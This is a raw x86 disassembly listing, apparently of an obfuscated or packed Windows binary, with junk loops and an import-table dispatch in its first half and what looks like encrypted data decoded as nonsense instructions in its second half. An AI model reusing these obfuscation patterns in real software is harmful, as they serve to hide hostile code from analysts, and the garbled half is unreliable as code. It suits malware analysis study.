  41737f:	add    edx,DWORD PTR [edx+esi*1]
  417382:	lea    eax,[ebp+0x14]
  417385:	sub    ecx,0x2a97
  41738b:	mov    DWORD PTR [ebp-0x4],eax
  41738e:	sub    DWORD PTR ds:0x426e8d,0x3cd0
  417398:	mov    DWORD PTR [ebp-0xc],0xf89c85b5
  41739f:	xor    DWORD PTR ds:0x426ea1,ebx
  4173a5:	lea    eax,[ebp-0xc]
  4173a8:	add    esi,ecx
  4173aa:	mov    DWORD PTR [ebp-0x14],eax
  4173ad:	xor    DWORD PTR ds:0x426f29,ecx
  4173b3:	mov    eax,DWORD PTR [ebp-0xc]
  4173b6:	or     ecx,edx
  4173b8:	mov    edx,DWORD PTR [ebp-0x14]
  4173bb:	mov    ecx,DWORD PTR ds:0x426f4d
  4173c1:	mov    esi,DWORD PTR ds:0x429d55
  4173c7:	sub    ecx,esi
  4173c9:	imul   ecx,DWORD PTR [ecx+esi*1]
  4173cd:	mov    ecx,0x75108b3
  4173d2:	and    DWORD PTR ds:0x426eb9,0x0
  4173dc:	xor    esi,esi
  4173de:	add    esi,DWORD PTR ds:0x426eb9
  4173e4:	inc    esi
  4173e5:	mov    DWORD PTR ds:0x426eb9,esi
  4173eb:	cmp    DWORD PTR ds:0x426eb9,0x9
  4173f2:	jle    0x41742f
  4173f8:	jmp    0x417408
  4173fd:	push   0x8342
  417402:	call   DWORD PTR ds:0x430a3c
  417408:	cmp    DWORD PTR ds:0x426eb9,0x8
  41740f:	jne    0x417422
  417415:	mov    esi,DWORD PTR ds:0x426eb9
  41741b:	inc    esi
  41741c:	mov    DWORD PTR ds:0x426eb9,esi
  417422:	cmp    DWORD PTR ds:0x426eb9,0x10
  417429:	jb     0x4173dc
  41742f:	xor    eax,ecx
  417431:	mov    esi,DWORD PTR ds:0x426eb9
  417437:	xor    esi,DWORD PTR ds:0x426f0d
  41743d:	mov    DWORD PTR ds:0x426eb9,esi
  417443:	add    eax,0x3272fa
  417448:	xor    esi,0x7991
  41744e:	mov    DWORD PTR [edx],eax
  417450:	mov    eax,ds:0x426141
  417455:	mov    edx,DWORD PTR [ebp-0x4]
  417458:	mov    eax,DWORD PTR [eax]
  41745a:	add    eax,DWORD PTR [edx]
  41745c:	and    DWORD PTR ds:0x426ed9,edx
  417462:	mov    DWORD PTR [ebp-0x8],eax
  417465:	and    DWORD PTR ds:0x426ecd,0x0
  41746f:	mov    edx,DWORD PTR ds:0x426ecd
  417475:	inc    edx
  417476:	mov    DWORD PTR ds:0x426ecd,edx
  41747c:	cmp    DWORD PTR ds:0x426ecd,0x5
  417483:	ja     0x4174d7
  417489:	jmp    0x4174b0
  41748e:	push   0x426ecd
  417493:	push   0x17b9
  417498:	push   0x1b0d
  41749d:	push   0x1721
  4174a2:	push   DWORD PTR [ebp-0xc]
  4174a5:	push   0x619f
  4174aa:	call   DWORD PTR ds:0x430a40
  4174b0:	cmp    DWORD PTR ds:0x426ecd,0x4
  4174b7:	jne    0x4174ca
  4174bd:	mov    edx,DWORD PTR ds:0x426ecd
  4174c3:	inc    edx
  4174c4:	mov    DWORD PTR ds:0x426ecd,edx
  4174ca:	cmp    DWORD PTR ds:0x426ecd,0x11
  4174d1:	jb     0x41746f
  4174d7:	mov    esi,DWORD PTR [ebp+0x8]
  4174da:	and    DWORD PTR ds:0x426e81,0x0
  4174e4:	mov    eax,ds:0x426e81
  4174e9:	inc    eax
  4174ea:	mov    ds:0x426e81,eax
  4174ef:	cmp    DWORD PTR ds:0x426e81,0x9
  4174f6:	ja     0x417532
  4174fc:	jmp    0x41750a
  417501:	push   DWORD PTR [ebp-0x14]
  417504:	call   DWORD PTR ds:0x430a0c
  41750a:	cmp    DWORD PTR ds:0x426e81,0x8
  417511:	jne    0x417525
  417517:	xor    eax,eax
  417519:	xor    eax,DWORD PTR ds:0x426e81
  41751f:	inc    eax
  417520:	mov    ds:0x426e81,eax
  417525:	cmp    DWORD PTR ds:0x426e81,0x18
  41752c:	jb     0x4174e4
  417532:	mov    eax,ds:0x4262c9
  417537:	and    DWORD PTR ds:0x426e99,0x0
  417541:	mov    edx,DWORD PTR ds:0x426e99
  417547:	inc    edx
  417548:	mov    DWORD PTR ds:0x426e99,edx
  41754e:	cmp    DWORD PTR ds:0x426e99,0xa
  417555:	jbe    0x417595
  41755b:	jmp    0x41756e
  417560:	push   DWORD PTR [ebp-0x14]
  417563:	push   0x426035
  417568:	call   DWORD PTR ds:0x430a44
  41756e:	cmp    DWORD PTR ds:0x426e99,0x9
  417575:	jne    0x417588
  41757b:	mov    edx,DWORD PTR ds:0x426e99
  417581:	inc    edx
  417582:	mov    DWORD PTR ds:0x426e99,edx
  417588:	cmp    DWORD PTR ds:0x426e99,0x1f
  41758f:	jb     0x417541
  417595:	mov    eax,DWORD PTR [eax+0x198]
  41759b:	xor    DWORD PTR ds:0x426efd,0x2868
  4175a5:	xor    esi,ecx
  4175a7:	mov    edx,DWORD PTR ds:0x426e91
  4175ad:	sbb    edx,DWORD PTR ds:0x426f1d
  4175b3:	mov    DWORD PTR ds:0x426e91,edx
  4175b9:	mov    edx,0x3272fa
  4175be:	add    esi,edx
  4175c0:	cmp    DWORD PTR [eax],esi
  4175c2:	mov    DWORD PTR ds:0x426f25,0x290b
  4175cc:	je     0x4175d9
  4175d2:	mov    eax,DWORD PTR [eax]
  4175d4:	jmp    0x41c1c5
  4175d9:	and    DWORD PTR ds:0x426e85,0x0
  4175e3:	jmp    0x4175f5
  4175e8:	mov    esi,DWORD PTR ds:0x426e85
  4175ee:	inc    esi
  4175ef:	mov    DWORD PTR ds:0x426e85,esi
  4175f5:	cmp    DWORD PTR ds:0x426e85,0x15
  4175fc:	jae    0x417657
  417602:	cmp    DWORD PTR ds:0x426e85,0xd
  417609:	jge    0x417657
  41760f:	jmp    0x417636
  417614:	push   DWORD PTR [ebp-0x14]
  417617:	push   0x2c9c
  41761c:	push   DWORD PTR [ebp-0x28]
  41761f:	push   0x295b
  417624:	push   DWORD PTR [ebp-0x24]
  417627:	push   DWORD PTR [ebp-0x24]
  41762a:	push   DWORD PTR [ebp-0x14]
  41762d:	push   DWORD PTR [ebp-0x1c]
  417630:	call   DWORD PTR ds:0x430a10
  417636:	cmp    DWORD PTR ds:0x426e85,0xc
  41763d:	jne    0x417652
  417643:	xor    esi,esi
  417645:	xor    esi,DWORD PTR ds:0x426e85
  41764b:	inc    esi
  41764c:	mov    DWORD PTR ds:0x426e85,esi
  417652:	jmp    0x4175e8
  417657:	mov    eax,DWORD PTR [ebp+0x18]
  41765a:	and    DWORD PTR ds:0x426f09,0x0
  417664:	jmp    0x417678
  417669:	xor    esi,esi
  41766b:	or     esi,DWORD PTR ds:0x426f09
  417671:	inc    esi
  417672:	mov    DWORD PTR ds:0x426f09,esi
  417678:	cmp    DWORD PTR ds:0x426f09,0x1e
  41767f:	jae    0x4176a2
  417685:	cmp    DWORD PTR ds:0x426f09,0x29
  41768c:	jl     0x4176a2
  417692:	jmp    0x41769d
  417697:	call   DWORD PTR ds:0x430a14
  41769d:	jmp    0x417669
  4176a2:	mov    esi,DWORD PTR [ebp+0x1c]
  4176a5:	or     ebx,0xffffffff
  4176a8:	mov    DWORD PTR ds:0x426e91,0x369f
  4176b2:	cmp    eax,0x70941f8a
  4176b7:	mov    DWORD PTR ds:0x426ec9,0x473e
  4176c1:	jne    0x417702
  4176c7:	mov    DWORD PTR ds:0x426edd,0x672c
  4176d1:	cmp    esi,ebx
  4176d3:	jne    0x417702
  4176d9:	mov    DWORD PTR ds:0x426f05,0x6cc9
  4176e3:	push   ebx
  4176e4:	mov    DWORD PTR ds:0x426edd,0x7b40
  4176ee:	push   0x70941f97
  4176f3:	mov    DWORD PTR ds:0x426eb5,0xfd5
  4176fd:	jmp    0x41c1b4
  417702:	not    eax
  417704:	mov    eax,DWORD PTR [ebp+0x18]
  417707:	mov    esi,DWORD PTR [ebp+0x1c]
  41770a:	cmp    eax,0x70941f97
  41770f:	jne    0x41773c
  417715:	mov    DWORD PTR ds:0x426e9d,0x16ae
  41771f:	cmp    esi,ebx
  417721:	jne    0x41773c
  417727:	mov    DWORD PTR ds:0x426f29,0x795f
  417731:	push   ebx
  417732:	push   0x70941f94
  417737:	jmp    0x41c1b4
  41773c:	mov    eax,0x27d6
  417741:	mov    eax,DWORD PTR [ebp+0x18]
  417744:	mov    esi,DWORD PTR [ebp+0x1c]
  417747:	mov    DWORD PTR ds:0x426e89,0x6099
  417751:	cmp    eax,0x70941f94
  417756:	mov    DWORD PTR ds:0x426f25,0x7197
  417760:	jne    0x417797
  417766:	mov    DWORD PTR ds:0x426ea9,0x1c69
  417770:	cmp    esi,ebx
  417772:	mov    DWORD PTR ds:0x426e99,0x2feb
  41777c:	jne    0x417797
  417782:	push   ebx
  417783:	mov    DWORD PTR ds:0x426f05,0xf40
  41778d:	push   0x70941f91
  417792:	jmp    0x41c1b4
  417797:	mov    eax,DWORD PTR [ebp+0x18]
  41779a:	mov    esi,DWORD PTR [ebp+0x1c]
  41779d:	cmp    eax,0x70941f91
  4177a2:	mov    DWORD PTR ds:0x426ea5,0x751d
  4177ac:	jne    0x4177e3
  4177b2:	mov    DWORD PTR ds:0x426ebd,0x378d
  4177bc:	cmp    esi,ebx
  4177be:	mov    DWORD PTR ds:0x426ef9,0x65e8
  4177c8:	jne    0x4177e3
  4177ce:	push   ebx
  4177cf:	push   0x70941f9e
  4177d4:	mov    DWORD PTR ds:0x426f01,0x54ba
  4177de:	jmp    0x41c1b4
  4177e3:	movzx  eax,BYTE PTR ds:0x426ef1
  4177ea:	mov    eax,DWORD PTR [ebp+0x18]
  4177ed:	mov    esi,DWORD PTR [ebp+0x1c]
  4177f0:	mov    edi,0x70941fa5
  4177f5:	mov    DWORD PTR ds:0x426f1d,0x1da7
  4177ff:	cmp    eax,edi
  417801:	mov    DWORD PTR ds:0x426f19,0x3c14
  41780b:	jne    0x41c152
  417811:	mov    DWORD PTR ds:0x426eb5,0x795b
  41781b:	cmp    esi,ebx
  41781d:	jne    0x41c152
  417823:	sub    edi,eax
  417825:	mov    eax,DWORD PTR [ebp+0x10]
  417828:	mov    DWORD PTR ds:0x426f15,0x1d
  417832:	cmp    DWORD PTR ds:0x426f15,0x0
  417839:	je     0x41788f
  41783f:	cmp    DWORD PTR ds:0x426f15,0x8
  417846:	jle    0x41788f
  41784c:	jmp    0x417861
  417851:	push   0x426f01
  417856:	push   0x6b2f
  41785b:	call   DWORD PTR ds:0x430a48
  417861:	cmp    DWORD PTR ds:0x426f15,0x9
  417868:	jne    0x41787d
  41786e:	xor    edi,edi
  417870:	or     edi,DWORD PTR ds:0x426f15
  417876:	dec    edi
  417877:	mov    DWORD PTR ds:0x426f15,edi
  41787d:	mov    edi,DWORD PTR ds:0x426f15
  417883:	dec    edi
  417884:	mov    DWORD PTR ds:0x426f15,edi
  41788a:	jmp    0x417832
  41788f:	xor    eax,ecx
  417891:	add    eax,edx
  417893:	mov    DWORD PTR [ebp-0x20],eax
  417896:	mov    eax,DWORD PTR [ebp+0xc]
  417899:	mov    esi,DWORD PTR [ebp-0x8]
  41789c:	xor    eax,ecx
  41789e:	add    eax,edx
  4178a0:	imul   eax,DWORD PTR [esi]
  4178a3:	mov    esi,DWORD PTR [ebp+0x8]
  4178a6:	xor    esi,ecx
  4178a8:	add    esi,edx
  4178aa:	cmp    esi,eax
  4178ac:	mov    eax,DWORD PTR [ebp-0x4]
  4178af:	mov    edi,0xffcd8d06
  4178b4:	je     0x4178d3
  4178ba:	mov    esi,DWORD PTR [ebp-0x20]
  4178bd:	add    DWORD PTR [eax],esi
  4178bf:	mov    eax,DWORD PTR [ebp-0x4]
  4178c2:	mov    esi,DWORD PTR [ebp+0xc]
  4178c5:	xor    esi,ecx
  4178c7:	add    esi,edx
  4178c9:	imul   esi,DWORD PTR [eax]
  4178cc:	mov    DWORD PTR [eax],esi
  4178ce:	jmp    0x4178d8
  4178d3:	mov    esi,DWORD PTR [ebp+0x14]
  4178d6:	xor    DWORD PTR [eax],esi
  4178d8:	mov    eax,DWORD PTR [ebp-0x4]
  4178db:	mov    esi,DWORD PTR [ebp+0x10]
  4178de:	xor    esi,ecx
  4178e0:	sub    edi,esi
  4178e2:	add    DWORD PTR [eax],edi
  4178e4:	mov    eax,DWORD PTR [ebp-0x4]
  4178e7:	mov    esi,DWORD PTR [ebp-0x8]
  4178ea:	add    esi,DWORD PTR [eax]
  4178ec:	mov    DWORD PTR [ebp-0x8],esi
  4178ef:	mov    eax,DWORD PTR [ebp+0xc]
  4178f2:	mov    esi,DWORD PTR [ebp+0xc]
  4178f5:	xor    esi,ecx
  4178f7:	xor    eax,ecx
  4178f9:	lea    eax,[eax+esi*1+0x64e5f4]
  417900:	mov    esi,DWORD PTR [ebp+0xc]
  417903:	xor    esi,ecx
  417905:	add    esi,edx
  417907:	imul   eax,esi
  41790a:	mov    esi,DWORD PTR [ebp+0xc]
  41790d:	xor    esi,ecx
  41790f:	sub    esi,eax
  417911:	mov    eax,DWORD PTR [ebp-0x4]
  417914:	add    esi,edx
  417916:	cmp    DWORD PTR [eax],esi
  417918:	mov    eax,DWORD PTR [ebp-0x4]
  41791b:	mov    esi,DWORD PTR [ebp+0x10]
  41791e:	jg     0x417934
  417924:	xor    esi,ecx
  417926:	mov    edi,0xffcd8d06
  41792b:	sub    edi,esi
  41792d:	add    DWORD PTR [eax],edi
  41792f:	jmp    0x41793a
  417934:	xor    esi,ecx
  417936:	add    esi,edx
  417938:	add    DWORD PTR [eax],esi
  41793a:	mov    eax,DWORD PTR [ebp-0x8]
  41793d:	mov    esi,DWORD PTR [ebp-0x10]
  417940:	mov    eax,DWORD PTR [eax]
  417942:	xor    esi,ecx
  417944:	add    esi,0x3272f9
  41794a:	mov    DWORD PTR [ebp-0x28],0x7097b85d
  417951:	mov    DWORD PTR [ebp-0x24],ebx
  417954:	not    esi
  417956:	mov    DWORD PTR [ebp-0x30],0x7097a55f
  41795d:	mov    DWORD PTR [ebp-0x2c],ebx
  417960:	jmp    0x419cec
  417965:	mov    bh,0xd2
  417967:	jae    0x417925
  417969:	jbe    0x4179c7
  41796b:	cmp    al,bh
  41796d:	add    BYTE PTR [edx],dl
  41796f:	sti    
  417970:	or     al,BYTE PTR [ecx]
  417972:	push   ebp
  417973:	push   es
  417974:	loop   0x4178fa
  417976:	mov    eax,0x9ce87b7a
  41797b:	jnp    0x4179f8
  41797d:	add    bh,BYTE PTR [edi+0x3d]
  417980:	(bad)  
  417982:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417983:	or     BYTE PTR [edx+0x18d7013c],bh
  417989:	push   esi
  41798a:	(bad)  
  41798b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41798c:	test   eax,0xe1a4e0f7
  417991:	das    
  417992:	popf   
  417993:	xor    DWORD PTR [edx+0x19],0xef8ca82a
  41799a:	pop    ebp
  41799b:	dec    esi
  41799c:	and    bh,bl
  41799e:	iret   
  41799f:	pusha  
  4179a0:	sahf   
  4179a1:	sti    
  4179a2:	lock in eax,dx
  4179a4:	and    bl,ah
  4179a6:	inc    edi
  4179a7:	or     dh,cl
  4179a9:	pop    eax
  4179aa:	or     eax,ebp
  4179ac:	std    
  4179ad:	fiadd  WORD PTR [ebp-0x7f41d95a]
  4179b3:	cmp    ebp,0xfffffff0
  4179b6:	out    dx,al
  4179b7:	mov    eax,0xb3488e16
  4179bc:	sbb    eax,0x46a576f3
  4179c1:	push   ecx
  4179c2:	mov    al,0x88
  4179c4:	test   eax,0x3e72692b
  4179c9:	push   edi
  4179ca:	nop
  4179cb:	stos   BYTE PTR es:[edi],al
  4179cc:	xor    bl,bl
  4179ce:	outs   dx,BYTE PTR ds:[esi]
  4179cf:	mov    ds:0x1ab6d5c2,eax
  4179d4:	aad    0xab
  4179d6:	scas   eax,DWORD PTR es:[edi]
  4179d7:	add    dl,BYTE PTR [ebx]
  4179d9:	lea    ebx,[ecx-0xf38d56a]
  4179df:	inc    ebp
  4179e0:	and    esp,DWORD PTR [esi]
  4179e2:	mov    al,ds:0x6af25ff
  4179e7:	popa   
  4179e8:	and    DWORD PTR [edx-0x6d],edi
  4179eb:	xchg   DWORD PTR [ecx],esi
  4179ed:	psllw  mm6,QWORD PTR [edx+ecx*1-0x2a]
  4179f2:	sahf   
  4179f3:	push   esi
  4179f4:	sub    bl,ah
  4179f6:	pop    eax
  4179f7:	inc    esi
  4179f8:	outs   dx,BYTE PTR ds:[esi]
  4179f9:	or     bl,BYTE PTR [edx+0x1096cc84]
  4179ff:	add    al,0x46
  417a01:	or     cl,ch
  417a03:	ret    
  417a04:	test   eax,0xb6cad6ee
  417a09:	pop    eax
  417a0a:	test   bh,ah
  417a0c:	mov    cl,0x84
  417a0e:	jg     0x417a86
  417a10:	xlat   BYTE PTR ds:[ebx]
  417a11:	mov    eax,0x735af346
  417a16:	xchg   al,dh
  417a18:	xchg   ecx,eax
  417a19:	inc    esp
  417a1a:	das    
  417a1b:	mov    edi,0x35c901f3
  417a20:	add    al,BYTE PTR [ecx+0x54]
  417a23:	std    
  417a24:	and    esp,DWORD PTR [esi-0x355a128d]
  417a2a:	scas   al,BYTE PTR es:[edi]
  417a2b:	jns    0x417a6b
  417a2d:	ins    DWORD PTR es:[edi],dx
  417a2e:	xchg   esi,eax
  417a2f:	dec    edx
  417a30:	imul   ebp,ebp,0x85fe6b0f
  417a36:	out    0x62,al
  417a38:	icebp  
  417a39:	jno    0x4179bd
  417a3b:	(bad)  
  417a3e:	or     al,0xb7
  417a40:	add    BYTE PTR [ecx-0x187271c5],bh
  417a46:	rcr    DWORD PTR [eax],cl
  417a48:	es in  eax,0x66
  417a4b:	enter  0x95da,0x8a
  417a4f:	dec    esi
  417a50:	shl    BYTE PTR [ecx+0x11491de0],cl
  417a56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a57:	je     0x417a56
  417a59:	mov    ds:0xed938e55,eax
  417a5e:	inc    DWORD PTR [esi+0x57342b16]
  417a64:	(bad)  
  417a65:	sti    
  417a66:	les    esp,FWORD PTR ds:[edi+0x61f37ad6]
  417a6d:	pusha  
  417a6e:	sub    edi,DWORD PTR [ebx+ecx*8-0x5b9dc21c]
  417a75:	sub    BYTE PTR [eax+ebp*1],0xc7
  417a79:	jmp    0x3c1ec8b1
  417a7e:	adc    DWORD PTR [si+0x4],esp
  417a82:	sbb    BYTE PTR [ebx+0x3ed8497d],bl
  417a88:	dec    edx
  417a89:	xlat   BYTE PTR ds:[ebx]
  417a8b:	ins    DWORD PTR es:[edi],dx
  417a8c:	xor    DWORD PTR [ebp+0x35],eax
  417a8f:	add    bl,bl
  417a91:	inc    edx
  417a92:	ror    al,1
  417a94:	and    ah,ch
  417a96:	pop    esi
  417a97:	leave  
  417a98:	in     al,0x3e
  417a9a:	mov    cs,eax
  417a9c:	mov    eax,0xb1a356f5
  417aa1:	sbb    BYTE PTR [edx+edi*4],ch
  417aa4:	inc    edi
  417aa5:	neg    DWORD PTR [esp+edx*8-0x18ef2303]
  417aac:	inc    eax
  417aad:	adc    BYTE PTR [edi],0xc
  417ab0:	adc    dh,BYTE PTR [esi]
  417ab2:	jns    0x417af1
  417ab4:	rcl    DWORD PTR [ecx-0x2a],1
  417ab7:	ss sub bh,ah
  417aba:	lea    esp,[esi]
  417abc:	test   al,0x82
  417abe:	dec    DWORD PTR [ebx+edx*2]
  417ac1:	scas   al,BYTE PTR es:[edi]
  417ac2:	(bad)  
  417ac4:	repnz aad 0x9a
  417ac7:	daa    
  417ac8:	out    dx,eax
  417ac9:	scas   eax,DWORD PTR es:[edi]
  417aca:	and    BYTE PTR [ebx-0x3e],ah
  417acd:	out    dx,al
  417ace:	test   edx,0x41bbd857
  417ad4:	and    esp,edi
  417ad6:	and    dl,ah
  417ad8:	push   0xffffffb7
  417ada:	aaa    
  417adb:	mov    esp,0xa0f6f053
  417ae0:	mov    esp,0x79b77a82
  417ae5:	call   0xfd47c805
  417aea:	inc    ebp
  417aeb:	cld    
  417aec:	mov    ah,0xb1
  417aee:	mov    al,ds:0xe127e1de
  417af3:	popa   
  417af4:	ror    BYTE PTR [ecx],0xff
  417af7:	in     eax,0x6f
  417af9:	ds cli 
  417afb:	xchg   ebp,eax
  417afc:	pushf  
  417afd:	out    dx,al
  417afe:	mov    dl,BYTE PTR ds:[esi+edx*4+0x7ff925b0]
  417b06:	sub    cl,BYTE PTR ds:0xb7fd8094
  417b0c:	in     eax,0xf8
  417b0e:	xor    eax,0x77cdf80d
  417b13:	push   edi
  417b14:	or     BYTE PTR [ecx],al
  417b16:	and    al,0xbf
  417b18:	mov    edi,0x85586226
  417b1d:	fisubr WORD PTR [eax+0x14]
  417b20:	xchg   esi,eax
  417b21:	imul   DWORD PTR [ebp+0x6a]
  417b24:	cmp    al,0x1d
  417b26:	push   0xffffffa3
  417b28:	stc    
  417b29:	dec    eax
  417b2a:	jg     0x417ba8
  417b2c:	ret    0xcc3d
  417b2f:	stos   BYTE PTR es:[edi],al
  417b30:	not    BYTE PTR [edx]
  417b32:	pushf  
  417b33:	shl    DWORD PTR [ecx-0x4c],1
  417b36:	mov    esi,?
  417b38:	(bad)  
  417b39:	mov    ss,ebx
  417b3b:	push   ecx
  417b3c:	mov    ebx,0x7913adcc
  417b41:	or     esi,ebp
  417b43:	ret    0x79a8
  417b46:	mov    cs,WORD PTR [ebx+0x41]
  417b49:	shl    ecx,0xc7
  417b4c:	or     DWORD PTR [ecx-0x4d7bea55],ebx
  417b52:	ins    DWORD PTR es:[edi],dx
  417b53:	retf   0xd4f2
  417b56:	mov    ebx,0x2126a2bf
  417b5b:	xor    ecx,DWORD PTR [edi]
  417b5d:	sbb    BYTE PTR [ecx],0xa9
  417b60:	sti    
  417b61:	int3   
  417b62:	cmp    esp,DWORD PTR [esi]
  417b64:	int    0x7f
  417b66:	fs repz dec ebp
  417b69:	addr16 mov eax,ds:0xfa7a
  417b6d:	std    
  417b6e:	sahf   
  417b6f:	shr    DWORD PTR [edx+0x36],cl
  417b72:	scas   eax,DWORD PTR es:[edi]
  417b73:	sub    al,0x95
  417b75:	enter  0x17f8,0xf5
  417b79:	enter  0xe9a8,0x51
  417b7d:	fcomip st,st(0)
  417b7f:	push   ebx
  417b80:	xchg   DWORD PTR [ebp+ecx*8-0x16cc08d],esp
  417b87:	rol    dl,cl
  417b89:	add    dh,BYTE PTR [esi]
  417b8b:	cwde   
  417b8c:	ror    BYTE PTR [edx-0x35],0xcd
  417b90:	(bad)  
  417b91:	js     0x417c10
  417b93:	int    0x68
  417b95:	ja     0x417b4f
  417b97:	clc    
  417b98:	pop    ss
  417b99:	push   edx
  417b9a:	fs sbb al,0x69
  417b9d:	popa   
  417b9e:	adc    DWORD PTR [ebx],ebx
  417ba0:	ret    0x81f
  417ba3:	shl    DWORD PTR [esi+0x502fe968],cl
  417ba9:	jo     0x417c03
  417bab:	dec    eax
  417bac:	aam    0xaf
  417bae:	outs   dx,BYTE PTR ds:[esi]
  417baf:	popf   
  417bb0:	imul   eax,DWORD PTR [ebx+0x6c],0xdaefc107
  417bb7:	aaa    
  417bb8:	sub    cl,BYTE PTR [edi-0x7c]
  417bbb:	pop    ebx
  417bbc:	sbb    eax,0xd84a0306
  417bc1:	loopne 0x417b88
  417bc3:	cmp    dh,BYTE PTR [ebx+0x0]
  417bc6:	pop    ebx
  417bc7:	jecxz  0x417b75
  417bc9:	inc    esp
  417bca:	dec    esp
  417bcb:	sub    bh,BYTE PTR [edx]
  417bcd:	aad    0x6a
  417bcf:	mov    bh,0x13
  417bd1:	inc    esi
  417bd2:	mov    dh,0xa9
  417bd4:	sub    cl,BYTE PTR [edi-0xd7eb8a4]
  417bda:	xor    BYTE PTR [edx-0x2fb947f6],ah
  417be0:	outs   dx,DWORD PTR ds:[esi]
  417be1:	stc    
  417be2:	add    eax,0xa1363640
  417be7:	adc    al,0x18
  417be9:	ss fst st(1)
  417bec:	add    eax,0x137c647c
  417bf1:	pop    ebx
  417bf2:	mov    DWORD PTR ds:0xe0312367,eax
  417bf8:	push   0xffffffda
  417bfa:	cld    
  417bfb:	inc    esp
  417bfc:	fidivr WORD PTR [ebx+ebx*4]
  417bff:	mov    esp,0x5714110d
  417c04:	or     al,0x78
  417c06:	add    eax,0xf3dbb7fd
  417c0b:	xchg   esi,eax
  417c0c:	rcr    al,1
  417c0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c0f:	sub    eax,0x815c9088
  417c14:	add    eax,0xd4164049
  417c19:	in     eax,dx
  417c1a:	xchg   ebx,eax
  417c1b:	dec    ebp
  417c1c:	jl     0x417c4c
  417c1e:	stc    
  417c1f:	adc    eax,0x22841d5
  417c24:	(bad)  
  417c25:	call   0xe891:0xc99dbc1
  417c2c:	ds test eax,0xc27ec6ad
  417c32:	mov    ?,WORD PTR [ecx]
  417c34:	icebp  
  417c35:	out    dx,al
  417c36:	and    cl,al
  417c38:	pushf  
  417c39:	pop    ss
  417c3a:	lds    ebp,FWORD PTR [esi]
  417c3c:	mov    WORD PTR [edi-0x72fe80a0],cs
  417c42:	dec    ecx
  417c43:	jle    0x417c8c
  417c45:	rcr    DWORD PTR [edi-0x25],cl
  417c48:	sub    ecx,DWORD PTR [ebx-0x3b]
  417c4b:	pushf  
  417c4c:	outs   dx,BYTE PTR ds:[esi]
  417c4d:	pop    ebp
  417c4e:	out    0xf0,al
  417c50:	fld    DWORD PTR [ebp+0x11d1e2a6]
  417c56:	inc    edx
  417c57:	and    dl,BYTE PTR [ecx]
  417c59:	push   esp
  417c5a:	outs   dx,BYTE PTR ds:[esi]
  417c5b:	cmp    DWORD PTR [ecx+ecx*2+0x360388c4],edi
  417c62:	xchg   BYTE PTR [edx-0x212d8197],al
  417c68:	fwait
  417c69:	(bad)  
  417c6a:	outs   dx,DWORD PTR ds:[esi]
  417c6b:	les    esp,FWORD PTR [edi-0x3c61a977]
  417c71:	adc    ebx,DWORD PTR [ebx+0x3c]
  417c74:	mov    ebx,0x52bef2be
  417c79:	push   0xffffffe7
  417c7b:	dec    ecx
  417c7c:	sbb    ebp,0x19
  417c7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c80:	xchg   edi,eax
  417c81:	idiv   DWORD PTR [ecx+0x4e]
  417c84:	pushf  
  417c85:	jmp    0x8863:0xab6d4be7
  417c8c:	cmp    dl,dh
  417c8e:	imul   edi,DWORD PTR [ecx],0x18
  417c91:	(bad)  
  417c92:	pop    ds
  417c93:	lods   al,BYTE PTR ds:[esi]
  417c94:	adc    ch,BYTE PTR [ebx-0x26f860c4]
  417c9a:	outs   dx,BYTE PTR ds:[esi]
  417c9b:	adc    eax,0x19a8b2dd
  417ca0:	imul   edi,DWORD PTR [ebx+ecx*2+0x21efdc6],0x45
  417ca8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ca9:	shl    BYTE PTR [edx+0x3cc9887c],0x7a
  417cb0:	push   edi
  417cb1:	cmp    BYTE PTR [ecx+0x6],ah
  417cb4:	mov    edx,0x3e9a796c
  417cb9:	cmp    eax,0x33bae1c5
  417cbe:	call   0x9d5910a6
  417cc3:	mov    eax,ds:0xe6a013a0
  417cc8:	jl     0x417d21
  417cca:	test   dl,0xaa
  417ccd:	lods   eax,DWORD PTR ds:[esi]
  417cce:	mov    BYTE PTR [esi+0x7b],cl
  417cd1:	hlt    
  417cd2:	shl    BYTE PTR [edi+0x3d],1
  417cd5:	in     al,0x9f
  417cd7:	les    edx,FWORD PTR [eax+ecx*4-0x69]
  417cdb:	(bad)  
  417cdc:	call   0x7e27:0x544aa2c6
  417ce3:	jg     0x417cff
  417ce5:	out    0x2,eax
  417ce7:	jmp    0x417cdc
  417ce9:	dec    ecx
  417cea:	ins    DWORD PTR es:[edi],dx
  417ceb:	mov    ds:0x114b54a4,eax
  417cf0:	sbb    BYTE PTR [ebx],bl
  417cf2:	fwait
  417cf3:	aam    0xf8
  417cf5:	test   esp,eax
  417cf7:	ror    DWORD PTR [edi],1
  417cf9:	mov    dh,0xd1
  417cfb:	sbb    DWORD PTR [ebp-0x7e],edi
  417cfe:	pop    ds
  417cff:	pop    ebx
  417d00:	xor    ecx,DWORD PTR [esi+0x4a7a7368]
  417d06:	pop    ecx
  417d07:	or     bl,dl
  417d09:	inc    ebx
  417d0a:	jmp    0x417ce4
  417d0c:	and    al,0x59
  417d0e:	push   ds
  417d0f:	xchg   ecx,eax
  417d10:	mov    dl,BYTE PTR [ebx-0x5618d32a]
  417d16:	push   esp
  417d17:	pop    esi
  417d18:	jmp    0xc16a:0xf8dc283f
  417d1f:	push   0x5bc0829d
  417d24:	push   ss
  417d25:	xor    al,0xb3
  417d27:	(bad)  
  417d28:	mov    DWORD PTR [ebp+0x40065c30],edi
  417d2e:	push   ecx
  417d2f:	xchg   ebp,eax
  417d30:	jl     0x417da8
  417d32:	(bad)  
  417d33:	sub    BYTE PTR [ebx+0x1d],ch
  417d36:	(bad)  
  417d38:	scas   al,BYTE PTR es:[edi]
  417d39:	jge    0x417d06
  417d3b:	iret   
  417d3c:	ror    DWORD PTR [ebx-0x67],1
  417d3f:	dec    edx
  417d40:	pop    edi
  417d41:	mov    BYTE PTR [edx-0x64d3d837],ch
  417d47:	cmp    eax,0x79fa733f
  417d4c:	cmc    
  417d4d:	cmp    ecx,DWORD PTR [eax-0xe1f70ce]
  417d53:	and    al,0xf6
  417d55:	data16 mov cl,0xf3
  417d58:	dec    edx
  417d59:	ds xchg esp,eax
  417d5b:	les    esi,FWORD PTR [eax-0x209514da]
  417d61:	add    ch,al
  417d63:	jp     0x417d50
  417d65:	mov    eax,0x2befdcb3
